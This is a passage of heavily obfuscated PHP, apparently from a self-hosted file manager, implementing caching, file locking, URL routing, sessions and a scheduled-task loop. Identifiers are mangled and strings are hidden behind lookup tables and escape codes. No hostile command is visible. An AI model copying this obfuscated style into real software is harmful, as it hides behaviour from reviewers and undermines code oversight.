self::$handle; } self::$memoryCache = array(); $õóÖù‘ = $GLOBALS[$×ØöÊ…¤[6]][$×ØöÊ…¤[427]]; $‚°«ÕÊ = $õóÖù‘[$õóÖù‘[$×ØöÊ…¤[927]]]; $ üÔÇ‰  = $õóÖù‘[$×ØöÊ…¤[928]]; switch ($õóÖù‘[$×ØöÊ…¤[927]]) { case $×ØöÊ…¤[21]: self::$handle = Model($×ØöÊ…¤[929]); break; case $×ØöÊ…¤[930]: self::$handle = new CacheRedis($‚°«ÕÊ, $ üÔÇ‰ ); break; case $×ØöÊ…¤[931]: self::$handle = new CacheMemcached($‚°«ÕÊ, $ üÔÇ‰ ); break; case $×ØöÊ…¤[233]: self::$handle = new CacheFile($‚°«ÕÊ, $ üÔÇ‰ ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¯‚Íì) { if (is_array($¯‚Íì) || is_object($¯‚Íì)) { $¯‚Íì = json_encode($¯‚Íì); } $¯‚Íì = rawurlencode($¯‚Íì); return md5(KOD_SITE_ID . $_SERVER[ÅÄÇĞô][11] . $¯‚Íì); } public static function get($òôªÆìœ, $œé‹Ÿì = false) { $–ù„Ş¨ = self::key($òôªÆìœ); $øÃ¼‹ÓÑ = self::init(); if ($œé‹Ÿì) { return unserialize($øÃ¼‹ÓÑ->get($–ù„Ş¨)); } if (!isset(self::$memoryCache[$–ù„Ş¨])) { $ÑÎ¯Èæ = $øÃ¼‹ÓÑ->get($–ù„Ş¨); self::$memoryCache[$–ù„Ş¨] = unserialize($ÑÎ¯Èæ); } return self::$memoryCache[$–ù„Ş¨]; } public static function set($·üï°Û¸, $ËÄé²åŒ, $Ù„Â¶ì  = false) { $È·ÌÔÊƒ =& $_SERVER[ÅÄÇĞô]; $¨Ìï«¯’ = self::key($·üï°Û¸); if (isset(self::$memoryCache[$¨Ìï«¯’]) && self::$memoryCache[$¨Ìï«¯’] === $ËÄé²åŒ) { return !0; } if ($Ù„Â¶ì  === 0) { self::$memoryCache[$¨Ìï«¯’] = $ËÄé²åŒ; return !0; } $ù…Ï¾äÂ = self::init(); $•ášœ“Ü = serialize($ËÄé²åŒ); CacheLock::lock($·üï°Û¸ . $È·ÌÔÊƒ[932]); $÷ ÚÔ® = $ù…Ï¾äÂ->set($¨Ìï«¯’, $•ášœ“Ü, $Ù„Â¶ì ); self::$memoryCache[$¨Ìï«¯’] = $ËÄé²åŒ; CacheLock::unlock($·üï°Û¸ . $È·ÌÔÊƒ[932]); return $÷ ÚÔ®; } public static function getCall($ïòÕ‚Õà, $²ÒĞéÉÂ, $è“úı¬à, $Ì£ÇÕ = array()) { $¥ÓÓ­•ğ =& $_SERVER[ÅÄÇĞô]; $ÙŸ“­ä÷ = self::get($ïòÕ‚Õà); if ($ÙŸ“­ä÷ || $ÙŸ“­ä÷ === $¥ÓÓ­•ğ[12]) { return $ÙŸ“­ä÷; } $ÙŸ“­ä÷ = call_user_func_array($è“úı¬à, $Ì£ÇÕ); $ÙŸ“­ä÷ = $ÙŸ“­ä÷ ? $ÙŸ“­ä÷ : $¥ÓÓ­•ğ[12]; self::set($ïòÕ‚Õà, $ÙŸ“­ä÷, $²ÒĞéÉÂ); return $ÙŸ“­ä÷; } public static function remove($Şçø¦–») { $›ğğ‡ğÈ = self::key($Şçø¦–»); unset(self::$memoryCache[$›ğğ‡ğÈ]); self::clearTimeout(); CacheLock::lock($Şçø¦–»); $À°½ë¬¿ = self::init()->remove($›ğğ‡ğÈ); CacheLock::unlock($Şçø¦–»); return $À°½ë¬¿; } public static function removeMemory($Â¾»¤) { $ãÂÄ£‹ñ = self::key($Â¾»¤); unset(self::$memoryCache[$ãÂÄ£‹ñ]); } public static function clearMemory($ØËñïÖ = false) { if ($ØËñïÖ) { $ØËñïÖ = self::key($ØËñïÖ); unset(self::$memoryCache[$ØËñïÖ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÅÄÇĞô][933])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÅÄÇĞô][934])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¹Ô“öá, $ÚÒÛÜğ) { $§ù¥¨ =& $_SERVER[ÅÄÇĞô]; $this->cachePath = $¹Ô“öá[$§ù¥¨[87]]; $this->prefix = $§ù¥¨[935]; $this->cacheTime = $ÚÒÛÜğ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ ıµó‡±) { $Ûï–±ˆ =& $_SERVER[ÅÄÇĞô]; $ ıµó‡± = str_replace(array($Ûï–±ˆ[936], $Ûï–±ˆ[100], $Ûï–±ˆ[76]), $Ûï–±ˆ[937], $ ıµó‡±); return $this->cachePath . $Ûï–±ˆ[938] . $ ıµó‡± . $Ûï–±ˆ[939]; } public function set($şŞ¡¡×¶, $äóÙÛ–Ô, $¼Àéı¯ô = false) { $¼Àéı¯ô = $¼Àéı¯ô ? $¼Àéı¯ô : $this->cacheTime; $“Å¬°Ç“ = $this->getFile($şŞ¡¡×¶); if (file_put_contents($“Å¬°Ç“, $this->prefix . $äóÙÛ–Ô, LOCK_EX)) { @touch($“Å¬°Ç“, intval(time() + $¼Àéı¯ô)); clearstatcache(); return !0; } @unlink($“Å¬°Ç“); return !1; } public function get($÷œÇÊ•Ï) { $ş ¥‘¨ú = $this->getFile($÷œÇÊ•Ï); if (file_exists($ş ¥‘¨ú) && filemtime($ş ¥‘¨ú) < time()) { @unlink($ş ¥‘¨ú); return !1; } $Ä§•ÑçÒ = @file_get_contents($ş ¥‘¨ú); return substr($Ä§•ÑçÒ, strlen($this->prefix)); } public function remove($®­Ú›êØ) { $§ĞÁòèÈ = $this->getFile($®­Ú›êØ); return @unlink($§ĞÁòèÈ); } public function deleteAll() { $˜¼ŒÍ =& $_SERVER[ÅÄÇĞô]; $ÜİËè = scandir($this->cachePath); foreach ($ÜİËè as $ºÊŞ·ÏŸ) { $Œ•Ë½Šò = $this->cachePath . $ºÊŞ·ÏŸ; if (strpos($Œ•Ë½Šò, $˜¼ŒÍ[939]) && strpos($Œ•Ë½Šò, $˜¼ŒÍ[940])) { @unlink($Œ•Ë½Šò); } } } public function clearTimeout() { $êâäØ” =& $_SERVER[ÅÄÇĞô]; $¦¶¡ûµÚ = scandir($this->cachePath); foreach ($¦¶¡ûµÚ as $ÒŒ«Â) { $ïĞÂÏ = $this->cachePath . $ÒŒ«Â; if (strpos($ïĞÂÏ, $êâäØ”[939]) && strpos($ïĞÂÏ, $êâäØ”[940]) && filemtime($ïĞÂÏ) < time()) { @unlink($ïĞÂÏ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $–Ğô„¼ =& $_SERVER[ÅÄÇĞô]; if (self::$handle) { return self::$handle; } $§Şğáì¶ = $GLOBALS[$–Ğô„¼[6]][$–Ğô„¼[427]]; self::$timeout = $§Şğáì¶[$–Ğô„¼[941]] ? $§Şğáì¶[$–Ğô„¼[941]] : 10; $“Ÿ²èÊÕ = _get($GLOBALS[$–Ğô„¼[6]], $–Ğô„¼[942]); $‘ç—øÇ = $§Şğáì¶[$–Ğô„¼[927]] ? $§Şğáì¶[$–Ğô„¼[927]] : $–Ğô„¼[233]; if ($‘ç—øÇ == $–Ğô„¼[21] && $“Ÿ²èÊÕ == $–Ğô„¼[13]) { $‘ç—øÇ = $–Ğô„¼[233]; } switch ($‘ç—øÇ) { case $–Ğô„¼[930]: self::$handle = new CacheLockRedis(); break; case $–Ğô„¼[931]: self::$handle = new CacheLockMemcached(); break; case $–Ğô„¼[21]: self::$handle = new CacheLockDatabase(); break; case $–Ğô„¼[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($–Ğô„¼[943], $–Ğô„¼[944]); } return self::$handle; } private static function key($†œÏ—) { return $_SERVER[ÅÄÇĞô][945] . Cache::key($†œÏ—); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÃïÑ•€Ò = '') { self::$errorMsg = $ÃïÑ•€Ò; } public static function lockGlobal($·ìÄ¼ƒ, $Üµ†Ìâ‰) { return self::lock($·ìÄ¼ƒ, $Üµ†Ìâ‰, !0); } public static function lock($Ó™Ù¦”, $ß„™Õ» = false, $˜©”Ğ = false) { $×ŞÇË™Ê =& $_SERVER[ÅÄÇĞô]; $£éÔûø = self::init(); $ÎºéÂÚª = self::key($Ó™Ù¦”); $ß„™Õ» = $ß„™Õ» ? $ß„™Õ» : self::$timeout; $‰¡ÌèÙé = timeFloat(); if ($GLOBALS[$×ŞÇË™Ê[946]]) { if (!$£éÔûø->lock($ÎºéÂÚª, 0.2)) { die; } return !0; } $¡¸·¢­£ = $£éÔûø->lock($ÎºéÂÚª, $ß„™Õ»); $„›‡Ÿ¿é = timeFloat(); if (!$¡¸·¢­£) { $ÇÔ¾½ş† = "\x6c\x6f\x63\153\x20\145\162\x72\157\x72\x3b\153\x65\171\75{$Ó™Ù¦”}\73\x74\x69\155\145\x3d{$ß„™Õ»}\73" . self::$errorMsg . $×ŞÇË™Ê[74] . get_caller_msg(); $Ã™›Ä“¬ = LNG($×ŞÇË™Ê[947]) . "\50{$ß„™Õ»}\163\x29\x2e" . LNG($×ŞÇË™Ê[948]); $Ã™›Ä“¬ .= $×ŞÇË™Ê[949]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ã™›Ä“¬ = $Ã™›Ä“¬ . $×ŞÇË™Ê[950] . self::$errorMsg; } write_log($×ŞÇË™Ê[951] . sprintf($×ŞÇË™Ê[952], timeFloat() - $‰¡ÌèÙé) . $×ŞÇË™Ê[953] . $ÇÔ¾½ş† . $×ŞÇË™Ê[954] . json_encode(error_get_last()), $×ŞÇË™Ê[944]); show_json($Ã™›Ä“¬, !1); } if (!$˜©”Ğ) { self::$lockItem[$ÎºéÂÚª] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¬—ÏáôÙ = number_format(timeFloat() - $„›‡Ÿ¿é, 3); write_log($×ŞÇË™Ê[955] . $Ó™Ù¦” . $×ŞÇË™Ê[956] . $¬—ÏáôÙ, $×ŞÇË™Ê[944]); } return $¡¸·¢­£; } public static function lockGet($ì½˜÷¯ò) { $Òùà­ªÜ = self::key($ì½˜÷¯ò); if (self::$lockItem[$Òùà­ªÜ]) { return self::$lockItem[$Òùà­ªÜ]; } return self::init()->lockGet($Òùà­ªÜ); } public static function unlock($Î…Èä¡) { $‡³ŞÙ¹ø =& $_SERVER[ÅÄÇĞô]; $Ûúİ±ÜÍ = self::key($Î…Èä¡); self::$lockItem[$Ûúİ±ÜÍ] = null; self::init()->unlock($Ûúİ±ÜÍ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($‡³ŞÙ¹ø[957] . $Î…Èä¡, $‡³ŞÙ¹ø[944]); } return; } public static function unlockRuntime() { $¯Ò ’˜Ô =& $_SERVER[ÅÄÇĞô]; $ª§‡Íª§ = self::init(); $É•ç¨ú— = !1; foreach (self::$lockItem as $†¯Úäƒ => $•Ô³Öí¢) { if (!$•Ô³Öí¢) { continue; } $ª§‡Íª§->unlock($†¯Úäƒ); if (!$É•ç¨ú—) { $É•ç¨ú— = !0; write_log($¯Ò ’˜Ô[958] . $†¯Úäƒ . $¯Ò ’˜Ô[74] . get_caller_msg(), $¯Ò ’˜Ô[944]); continue; } write_log($¯Ò ’˜Ô[958] . $†¯Úäƒ, $¯Ò ’˜Ô[944]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¥¸×¬“ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¯Ò ’˜Ô[959] . $¥¸×¬“ . $¯Ò ’˜Ô[960] . ACTION, $¯Ò ’˜Ô[944]); } } public static function fileLock($íÄœÏÚ¡) { $ïÍ¦”Ø• =& $_SERVER[ÅÄÇĞô]; if (!$GLOBALS[$ïÍ¦”Ø•[961]]) { $GLOBALS[$ïÍ¦”Ø•[961]] = array(); } $GLOBALS[$ïÍ¦”Ø•[961]][$íÄœÏÚ¡] = !1; $à“‘Ì = fopen(DATA_PATH . $íÄœÏÚ¡ . $ïÍ¦”Ø•[962], $ïÍ¦”Ø•[963]); if (!$à“‘Ì) { return !1; } $GLOBALS[$ïÍ¦”Ø•[961]][$íÄœÏÚ¡] = $à“‘Ì; if (flock($à“‘Ì, LOCK_EX)) { return !0; } self::unlock($íÄœÏÚ¡); show_json($ïÍ¦”Ø•[964], !1); return !1; } public static function fileUnlock($Ğì­À¬Ä) { $¼ÀÈñáÕ =& $_SERVER[ÅÄÇĞô]; $š˜—¬û• = $GLOBALS[$¼ÀÈñáÕ[961]][$Ğì­À¬Ä]; if (!$š˜—¬û•) { return; } $GLOBALS[$¼ÀÈñáÕ[961]][$Ğì­À¬Ä] = !1; flock($š˜—¬û•, LOCK_UN); fclose($š˜—¬û•); } public static function fileUnlockAll() { $ˆîºäÊÄ =& $_SERVER[ÅÄÇĞô]; if (!isset($GLOBALS[$ˆîºäÊÄ[961]]) || !$GLOBALS[$ˆîºäÊÄ[961]]) { return; } foreach ($GLOBALS[$ˆîºäÊÄ[961]] as $Êìƒá™ğ => $´“™°¶ı) { if (!$´“™°¶ı) { continue; } $GLOBALS[$ˆîºäÊÄ[961]][$Êìƒá™ğ] = !1; flock($´“™°¶ı, LOCK_UN); fclose($´“™°¶ı); } $GLOBALS[$ˆîºäÊÄ[961]] = array(); } } goto Cª¡»¨ç­…; a“ëã¾Œ¯: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\x5b\x5e\57\x5d\53", "\x3a\156\165\155" => "\x5b\x30\55\71\x5d\x2b", "\x3a\x61\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($úà‰ô©Ş, $Ú–ä§ÈÎ) { $åŸãÔóÀ =& $_SERVER[ÅÄÇĞô]; if ($úà‰ô©Ş == $åŸãÔóÀ[1732]) { $êßÊÕíş = array_map($åŸãÔóÀ[1733], $Ú–ä§ÈÎ[0]); $Â¨¬ÕŸŸ = strpos($Ú–ä§ÈÎ[1], $åŸãÔóÀ[8]) === 0 ? $Ú–ä§ÈÎ[1] : $åŸãÔóÀ[8] . $Ú–ä§ÈÎ[1]; $×†‚Æª½ = $Ú–ä§ÈÎ[2]; } else { $êßÊÕíş = null; $Â¨¬ÕŸŸ = strpos($Ú–ä§ÈÎ[0], $åŸãÔóÀ[8]) === 0 ? $Ú–ä§ÈÎ[0] : $åŸãÔóÀ[8] . $Ú–ä§ÈÎ[0]; $×†‚Æª½ = $Ú–ä§ÈÎ[1]; } array_push(self::$maps, $êßÊÕíş); array_push(self::$routes, $Â¨¬ÕŸŸ); array_push(self::$methods, strtoupper($úà‰ô©Ş)); array_push(self::$callbacks, $×†‚Æª½); } public static function error($ö‡îæ‡­) { self::$errorCallback = $ö‡îæ‡­; } public static function haltOnMatch($ÛŠØšŒ½ = true) { self::$halts = $ÛŠØšŒ½; } public static function dispatch() { $î˜ŠˆÚ„ =& $_SERVER[ÅÄÇĞô]; $‡€íäÑ– = parse_url($_SERVER[$î˜ŠˆÚ„[1734]], PHP_URL_PATH); $ÏÒò´Ø… = $_SERVER[$î˜ŠˆÚ„[164]]; $ÆçƒÛòÍ = array_keys(static::$patterns); $ˆ›ÊğÁó = array_values(static::$patterns); $“ŒçÁœË = !1; self::$routes = preg_replace($î˜ŠˆÚ„[1384], $î˜ŠˆÚ„[8], self::$routes); if (in_array($‡€íäÑ–, self::$routes)) { $§ß‘ì½ª = array_keys(self::$routes, $‡€íäÑ–); foreach ($§ß‘ì½ª as $İ˜“ûäê) { if (self::$methods[$İ˜“ûäê] == $ÏÒò´Ø… || self::$methods[$İ˜“ûäê] == $î˜ŠˆÚ„[1735] || in_array($ÏÒò´Ø…, self::$maps[$İ˜“ûäê])) { $“ŒçÁœË = !0; if (!is_object(self::$callbacks[$İ˜“ûäê])) { $©ò¿Ãí£ = explode($î˜ŠˆÚ„[8], self::$callbacks[$İ˜“ûäê]); $®í˜ÔÛ¼ = end($©ò¿Ãí£); $‘šÆ¥™Æ = explode($î˜ŠˆÚ„[1316], $®í˜ÔÛ¼); $Æ¨œ—Í = new $‘šÆ¥™Æ[0](); $Æ¨œ—Í->{$‘šÆ¥™Æ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$İ˜“ûäê]); if (self::$halts) { return; } } } } } else { $±Ğø€†Ã = 0; foreach (self::$routes as $İ˜“ûäê) { if (strpos($İ˜“ûäê, $î˜ŠˆÚ„[4]) !== !1) { $İ˜“ûäê = str_replace($ÆçƒÛòÍ, $ˆ›ÊğÁó, $İ˜“ûäê); } if (preg_match($î˜ŠˆÚ„[1736] . $İ˜“ûäê . $î˜ŠˆÚ„[1737], $‡€íäÑ–, $ ÓõÅ¥È)) { if (self::$methods[$±Ğø€†Ã] == $ÏÒò´Ø… || self::$methods[$±Ğø€†Ã] == $î˜ŠˆÚ„[1735] || !empty(self::$maps[$±Ğø€†Ã]) && in_array($ÏÒò´Ø…, self::$maps[$±Ğø€†Ã])) { $“ŒçÁœË = !0; array_shift($ ÓõÅ¥È); if (!is_object(self::$callbacks[$±Ğø€†Ã])) { $©ò¿Ãí£ = explode($î˜ŠˆÚ„[8], self::$callbacks[$±Ğø€†Ã]); $®í˜ÔÛ¼ = end($©ò¿Ãí£); $‘šÆ¥™Æ = explode($î˜ŠˆÚ„[1316], $®í˜ÔÛ¼); $Æ¨œ—Í = new $‘šÆ¥™Æ[0](); if (!method_exists($Æ¨œ—Í, $‘šÆ¥™Æ[1])) { echo $î˜ŠˆÚ„[1738]; } else { call_user_func_array(array($Æ¨œ—Í, $‘šÆ¥™Æ[1]), $ ÓõÅ¥È); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$±Ğø€†Ã], $ ÓõÅ¥È); if (self::$halts) { return; } } } } $±Ğø€†Ã++; } } if ($“ŒçÁœË == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $½ßíª¦ =& $_SERVER[ÅÄÇĞô]; header($_SERVER[$½ßíª¦[1739]] . $½ßíª¦[1740]); echo $½ßíª¦[1741]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$î˜ŠˆÚ„[1734]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Â¡™ªù =& $_SERVER[ÅÄÇĞô]; static $€„‡Û„• = false; if ($€„‡Û„•) { return $€„‡Û„•; } $…¡şÍ¤¤ = $GLOBALS[$Â¡™ªù[6]][$Â¡™ªù[427]]; self::$sessionTime = $…¡şÍ¤¤[$Â¡™ªù[1742]]; $íÍşÚ¡ñ = isset($GLOBALS[$Â¡™ªù[1743]]) ? $GLOBALS[$Â¡™ªù[1743]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($íÍşÚ¡ñ)) { self::$sessionSign = Cookie::get($íÍşÚ¡ñ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($íÍşÚ¡ñ, self::$sessionSign, self::$sessionTime); $İ›®ˆÎ† = $…¡şÍ¤¤[$Â¡™ªù[1744]]; $ã¯Ê˜ßï = $…¡şÍ¤¤[$İ›®ˆÎ†]; $õÚ±ó = $…¡şÍ¤¤[$Â¡™ªù[928]]; switch ($İ›®ˆÎ†) { case $Â¡™ªù[21]: self::$handle = Model($Â¡™ªù[929]); break; case $Â¡™ªù[930]: self::$handle = new CacheRedis($ã¯Ê˜ßï, $õÚ±ó); break; case $Â¡™ªù[931]: self::$handle = new CacheMemcached($ã¯Ê˜ßï, $õÚ±ó); break; case $Â¡™ªù[233]: $ã¯Ê˜ßï[$Â¡™ªù[87]] = $ã¯Ê˜ßï[$Â¡™ªù[87]] . $Â¡™ªù[1745]; self::$handle = new CacheFile($ã¯Ê˜ßï, $õÚ±ó); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $€„‡Û„• = new self(); return $€„‡Û„•; } public static function getBySign($æ£¶¼—¦) { $Ù¨ûÂ‚¤ = self::$handle->get($æ£¶¼—¦); $Ù¨ûÂ‚¤ = unserialize($Ù¨ûÂ‚¤); return is_array($Ù¨ûÂ‚¤) ? $Ù¨ûÂ‚¤ : array(); } public static function setBySign($Ìñé£Œ², $™÷œŸê°) { CacheLock::lock($Ìñé£Œ²); self::$handle->set($Ìñé£Œ², serialize($™÷œŸê°), self::$sessionTime); CacheLock::unlock($Ìñé£Œ²); } public static function sign($ê›†Æ±» = false) { if ($ê›†Æ±») { self::$sessionSign = $ê›†Æ±»; } self::init(); return self::$sessionSign; } public static function set($Õóò­å, $Áøùòüã = false) { self::init(); if (is_array($Õóò­å)) { foreach ($Õóò­å as $ŠÙ³ô€À => $ğ¸û™©‡) { array_set_value(self::$data, $ŠÙ³ô€À, $ğ¸û™©‡); } } else { array_set_value(self::$data, $Õóò­å, $Áøùòüã); } self::setBySign(self::$sessionSign, self::$data); } public static function get($›ì²¶†Ê = false) { self::init(); if (!$›ì²¶†Ê) { return self::$data; } return array_get_value(self::$data, $›ì²¶†Ê); } public static function remove($ˆÜÒ¿ñ£) { self::init(); unset(self::$data[$ˆÜÒ¿ñ£]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÅÄÇĞô][934])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $º²Õìí =& $_SERVER[ÅÄÇĞô]; if (self::valueGet($º²Õìí[845]) != $º²Õìí[91]) { return; } if (self::valueGet($º²Õìí[1746]) == $º²Õìí[91]) { $–ÒôÇ²› = self::valueGet($º²Õìí[1747]); if (time() - $–ÒôÇ²› > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($º²Õìí[1746], $º²Õìí[91]); self::log($º²Õìí[1748] . ACTION . $º²Õìí[1749]); Hook::bind($º²Õìí[1750], $º²Õìí[1751]); $ïÉ±ÅñÆ = 0; while (!0) { self::cacheClear(); if (self::valueGet($º²Õìí[845]) != $º²Õìí[91]) { self::valueSet($º²Õìí[1746], $º²Õìí[231]); self::log($º²Õìí[1752]); die; } $ö‚óÅõ· = time(); if ($ö‚óÅõ· - $ïÉ±ÅñÆ >= 60) { self::valueSet(array($º²Õìí[1746] => $º²Õìí[91], $º²Õìí[1747] => $ö‚óÅõ·)); $ïÉ±ÅñÆ = $ö‚óÅõ·; } if (!file_exists(USER_SYSTEM . $º²Õìí[1753])) { self::valueSet(array($º²Õìí[1746] => $º²Õìí[231], $º²Õìí[845] => $º²Õìí[231])); self::log($º²Õìí[1754]); die; } $·áñÍ®Û = file_get_contents(BASIC_PATH . $º²Õìí[1755]); $åÉ·œ¶³ = KOD_VERSION . $º²Õìí[10] . KOD_VERSION_BUILD; $–ùé‘±ı = match_text($·áñÍ®Û, $º²Õìí[1756]) . $º²Õìí[10] . match_text($·áñÍ®Û, $º²Õìí[1757]); if ($–ùé‘±ı != $åÉ·œ¶³) { self::restart(); self::log("\163\x74\x6f\160\x65\x64\56\x5b\x76\145\162\x73\x69\157\156\x20\165\160\x64\x61\164\145\x3b{$versionNow}\40\x3d\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ì€èÕ… =& $_SERVER[ÅÄÇĞô]; http_close(); $GLOBALS[$Ì€èÕ…[1758]] = 1; $_SERVER[$Ì€èÕ…[1759]] = $Ì€èÕ…[1760]; $_COOKIE = array(); $GLOBALS[$Ì€èÕ…[1761]] = 1; $GLOBALS[$Ì€èÕ…[1762]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $˜ïêºİ¥ =& $_SERVER[ÅÄÇĞô]; http_close(); self::valueSet($˜ïêºİ¥[845], $˜ïêºİ¥[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($˜ïêºİ¥[1746] => $˜ïêºİ¥[231], $˜ïêºİ¥[845] => $˜ïêºİ¥[91])); self::log($˜ïêºİ¥[1763]); } public static function taskSwitch() { $«¸˜÷ì =& $_SERVER[ÅÄÇĞô]; $Ã—©÷—´ = self::valueGet($«¸˜÷ì[845]) == $«¸˜÷ì[91] ? $«¸˜÷ì[231] : $«¸˜÷ì[91]; self::valueSet($«¸˜÷ì[845], $Ã—©÷—´); } public static function shutdownEvent() { $½ƒŞÃ¿× =& $_SERVER[ÅÄÇĞô]; self::valueSet($½ƒŞÃ¿×[1746], $½ƒŞÃ¿×[231]); self::log($½ƒŞÃ¿×[1764]); } public static function config($ê÷ãÏŠ´, $İºó–ãµ) { self::valueSet($_SERVER[ÅÄÇĞô][845], $ê÷ãÏŠ´); } private static function taskRunAll() { $Ğöáí¾™ =& $_SERVER[ÅÄÇĞô]; $«ÃÆ¨àÊ = timeFloat(); $Š‹ĞêœË = Model($Ğöáí¾™[1765])->listData(); $îı•áÄï = count($Š‹ĞêœË); for ($ÜÁôÌğ× = 0; $ÜÁôÌğ× < $îı•áÄï; $ÜÁôÌğ×++) { $¬Ò“”Æí = $Š‹ĞêœË[$ÜÁôÌğ×]; if (!$¬Ò“”Æí[$Ğöáí¾™[478]] || $¬Ò“”Æí[$Ğöáí¾™[1766]] != $Ğöáí¾™[91]) { continue; } if (!self::taskTimeCheck($¬Ò“”Æí)) { continue; } self::taskRun($¬Ò“”Æí); } Hook::trigger($Ğöáí¾™[1767]); self::taskQueueRun($«ÃÆ¨àÊ); } private static function taskQueueRun($Œë·®—¬) { $³öŠ´ò’ = 10; while (!0) { $Òó“Ùéˆ = TaskQueue::run(); if ($Òó“Ùéˆ === !1) { break; } if (timeFloat() - $Œë·®—¬ >= $³öŠ´ò’) { break; } } } private static function taskTimeCheck($Š‹’ÂâÆ) { $ßÃÁíğŸ =& $_SERVER[ÅÄÇĞô]; $š†°ÒªÎ = json_decode($Š‹’ÂâÆ[$ßÃÁíğŸ[207]], !0); $©¼•Şõ¹ = intval($Š‹’ÂâÆ[$ßÃÁíğŸ[1747]]); $²«ŞÓ´¥ = strtotime($ßÃÁíğŸ[1768] . $š†°ÒªÎ[$ßÃÁíğŸ[1769]] . $ßÃÁíğŸ[1770]) - strtotime($ßÃÁíğŸ[1771]); $êğ¥„Òø = time() - strtotime(date($ßÃÁíğŸ[1772]) . $ßÃÁíğŸ[1773]); $Ÿ¤ÉùĞ = $êğ¥„Òø >= $²«ŞÓ´¥ && $êğ¥„Òø <= $²«ŞÓ´¥ + 3600; switch ($š†°ÒªÎ[$ßÃÁíğŸ[33]]) { case $ßÃÁíğŸ[1774]: if (time() - $©¼•Şõ¹ < 3600 * 24 * 30) { return !1; } if ($š†°ÒªÎ[$ßÃÁíğŸ[1774]] == date($ßÃÁíğŸ[1775]) && $Ÿ¤ÉùĞ) { return !0; } break; case $ßÃÁíğŸ[1776]: if (time() - $©¼•Şõ¹ < 3600 * 24 * 7) { return !1; } $ô¹ğ©±Ù = date($ßÃÁíğŸ[1777]) == 0 ? 7 : date($ßÃÁíğŸ[1777]); if ($š†°ÒªÎ[$ßÃÁíğŸ[1776]] == $ô¹ğ©±Ù && $Ÿ¤ÉùĞ) { return !0; } break; case $ßÃÁíğŸ[1769]: if (time() - $©¼•Şõ¹ < 3600 * 24) { return !1; } if ($Ÿ¤ÉùĞ) { return !0; } break; case $ßÃÁíğŸ[1778]: if (time() - $©¼•Şõ¹ >= floatval($š†°ÒªÎ[$ßÃÁíğŸ[1778]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ıÀÀÙÖí =& $_SERVER[ÅÄÇĞô]; static $‡’Åß¡Ú = 0; $áÎÍæÁ÷ = 300; if (!$‡’Åß¡Ú) { $‡’Åß¡Ú = time(); } if (time() - $‡’Åß¡Ú < $áÎÍæÁ÷) { return; } $‡’Åß¡Ú = time(); $’×Ë†ñõ = Model($ıÀÀÙÖí[582])->db($ıÀÀÙÖí[12]); if ($’×Ë†ñõ) { $’×Ë†ñõ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ıÀÀÙÖí[1779], $ıÀÀÙÖí[1780]); die; } } public static function taskRun($ÑÚ¬ïøÜ) { $¬Á´À• =& $_SERVER[ÅÄÇĞô]; self::log($¬Á´À•[1781] . $ÑÚ¬ïøÜ[$¬Á´À•[478]] . $¬Á´À•[1782] . $ÑÚ¬ïøÜ[$¬Á´À•[32]] . $¬Á´À•[1783] . $ÑÚ¬ïøÜ[$¬Á´À•[1784]]); Model($¬Á´À•[1765])->run($ÑÚ¬ïøÜ[$¬Á´À•[478]]); $½Ş úĞô = timeFloat(); $×†©çÂ’ = $¬Á´À•[12]; switch ($ÑÚ¬ïøÜ[$¬Á´À•[33]]) { case $¬Á´À•[385]: $„Ø‰Ù«˜ = url_request($ÑÚ¬ïøÜ[$¬Á´À•[1784]], $¬Á´À•[1519], !1, !1, !1, !1, 10); if ($„Ø‰Ù«˜[$¬Á´À•[845]]) { $×†©çÂ’ = strlen($„Ø‰Ù«˜[$¬Á´À•[1310]]); } break; case $¬Á´À•[1785]: $×†©çÂ’ = Hook::apply($ÑÚ¬ïøÜ[$¬Á´À•[1784]]); default: break; } Model($¬Á´À•[1786])->add(array($¬Á´À•[1787] => 